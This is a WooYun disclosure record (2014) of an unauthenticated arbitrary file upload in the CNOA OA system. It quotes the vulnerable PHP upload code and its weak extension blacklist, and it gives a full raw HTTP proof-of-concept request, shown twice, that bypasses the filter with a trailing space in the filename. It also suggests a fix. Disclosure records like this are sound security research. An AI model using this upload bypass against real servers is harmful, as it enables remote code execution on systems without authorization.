{"id": 767, "wybug_id": "wooyun-2014-073972", "wybug_title": "协众OA系统任意文件上传 (无需登录)", "wybug_corp": "www.cnoa.cn", "wybug_author": "pangshenjie", "wybug_date": "2014-08-27 18:20", "wybug_open_date": "2014-10-11 18:22", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-10-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一处任意文件上传。 详细说明：  代码用了zend加密，可decode大部分代码。web目录的存在一处配置文件 www\\file\\webcache\\noNeedCheckPermitActionList.data.php通过代码逻辑，这里面涉及的controller和方法应该是不需要登陆验证的，其中www\\app\\main\\source\\mainCommon.class.php：\npublic function actionUpfile( )    {        global $CNOA_DB;        $act = getpar( $_GET, \"act\", \"\" );        @ini_set( \"default_socket_timeout\", \"86400\" );        @ini_set( \"max_input_time\", \"86400\" );        set_time_limit( 0 );        $CNOA_FS = new fs( );        $file_ext = strtolower( strrchr( $_FILES['Filedata']['name'], \".\" ) );        $file_name = $CNOA_FS->mkName( ).$file_ext;        if ( $act == \"upforhtmleditor\" )        {            $savePath = CNOA_PATH_FILE.\"/common/upload/\".date( \"Y.m.d\", $GLOBALS['CNOA_TIMESTAMP'] ).\"/\";            $viewPath = \"{$GLOBALS['URL_FILE']}/common/upload/\".date( \"Y.m.d\", $GLOBALS['CNOA_TIMESTAMP'] ).\"/\";            mkdirs( $savePath );            $file_dst = $savePath.$file_name;            filterphpfileupload( );            @move_uploaded_file( @$_FILES['Filedata']['tmp_name'], $file_dst );            echo $viewPath.$file_name;            exit( );        }        $file_dst = CNOA_PATH_FILE.\"/common/temp/\".$file_name;        filterphpfileupload( );        @move_uploaded_file( @$_FILES['Filedata']['tmp_name'], $file_dst );        echo $file_name;        exit( );    }\n$file_ext 直接取的上传文件的后缀，但是后面有一个filterphpfileupload(）函数对上传文件检查，跟踪这个函数,在www\\core\\inc\\function.func.php 中：\nfunction filterPHPFileUpload( ){    foreach ( $_FILES as $k => $v )    {        $ext = strtolower( strrchr( $v['name'], \".\" ) );        if ( in_array( $ext, array( \".php\", \".phpx\", \".php3\" ) ) )        {            $arr = array( );            $arr['failure'] = TRUE;            $arr['msg'] = \"不允许上传php文件\";            echo json_encode( $arr );            exit( );            break;        }    }}\n上传文件名后直接加空格直接bypass。poc（无需登录）：POST /index.php?action=upFile&act=upforhtmleditor  HTTP/1.1Host: oa.cnoa.cnProxy-Connection: keep-aliveContent-Length: 304Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: nullUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCy4HVT4TPkeHYzqAAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: CNOA_LOGIN_USERNAME=c1OiJhZG1pbiI7; CNOA_language=cn; CNOAOASESSID=ssddfhsd2diu71c2s9ss------WebKitFormBoundaryCy4HVT4TPkeHYzqAContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.php \"Content-Type: text/plain<?phpphpinfo();?>------WebKitFormBoundaryCy4HVT4TPkeHYzqAContent-Disposition: form-data; name=\"submit\"Submit------WebKitFormBoundaryCy4HVT4TPkeHYzqA--   漏洞证明：  http://oa.cnoa.cn/file/common/upload/2014.08.27/20140827181850_2e6b714026603a9b847b64d59f7c37d9.cnoa.phppoc（无需登录）：POST /index.php?action=upFile&act=upforhtmleditor  HTTP/1.1Host: oa.cnoa.cnProxy-Connection: keep-aliveContent-Length: 304Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: nullUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCy4HVT4TPkeHYzqAAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: CNOA_LOGIN_USERNAME=c1OiJhZG1pbiI7; CNOA_language=cn; CNOAOASESSID=ssddfhsd2diu71c2s9ss------WebKitFormBoundaryCy4HVT4TPkeHYzqAContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.php \"Content-Type: text/plain<?phpphpinfo();?>------WebKitFormBoundaryCy4HVT4TPkeHYzqAContent-Disposition: form-data; name=\"submit\"Submit------WebKitFormBoundaryCy4HVT4TPkeHYzqA--\n\n   修复方案：  trim() Or 白名单   版权声明：转载请注明来源 pangshenjie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-08-28 14:39 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  顶菊花    \n     2014-08-28 17:40 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @pandas 顶ls菊花    \n     2014-08-28 20:19 |    \t\t无人知晓 \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:7        | 一个苦逼的程序猿)\t\t \n  顶菊爷    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}